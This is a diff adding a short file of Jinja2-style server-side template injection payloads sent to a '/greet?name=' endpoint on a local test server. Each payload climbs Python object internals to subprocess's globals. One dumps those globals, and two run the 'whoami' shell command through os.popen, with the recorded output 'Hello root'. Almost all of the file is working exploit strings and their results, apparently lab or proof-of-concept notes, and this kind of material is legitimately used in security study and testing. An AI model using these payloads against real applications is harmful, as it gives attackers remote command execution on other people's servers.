@@ -1,0 +1,30 @@
+{{().__class__.__bases__[0].__subclasses__()[529].__init__.__globals__}}
+# command: http://127.0.0.1:5000/greet?name={{().__class__.__bases__[0].__subclasses__()[529].__init__.__globals__}}
+#  return:
+# 
+# Hello {'__name__': 'subprocess', '__doc__': 'Subprocesses with accessible
+# I/O streams\n\nThis module allows you to spawn processes, connect to
+# 
+# ...
+# 
+# '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions,
+# 
+# ...
+# 
+# '/usr/local/lib/python3.12/locale.py'>, 'os': <module 'os' (frozen)>, 'time':
+# 
+# ...
+# 
+# class 'subprocess.Popen'>}
+
+{{().__class__.__bases__[0].__subclasses__()[529].__init__.__globals__["os"].popen("whoami").read()}}
+# command: http://127.0.0.1:5000/greet?name={{().__class__.__bases__[0].__subclasses__()[529].__init__.__globals__["os"].popen("whoami").read()}}
+#  return
+# 
+# Hello root
+
+{{().__class__.__bases__[0].__subclasses__()[529].__init__.__globals__["__builtins__"].__import__("os").popen("whoami").read()}}
+# command: http://127.0.0.1:5000/greet?name={{().__class__.__bases__[0].__subclasses__()[529].__init__.__globals__["__builtins__"].__import__("os").popen("whoami").read()}}
+#  return
+# 
+# Hello root
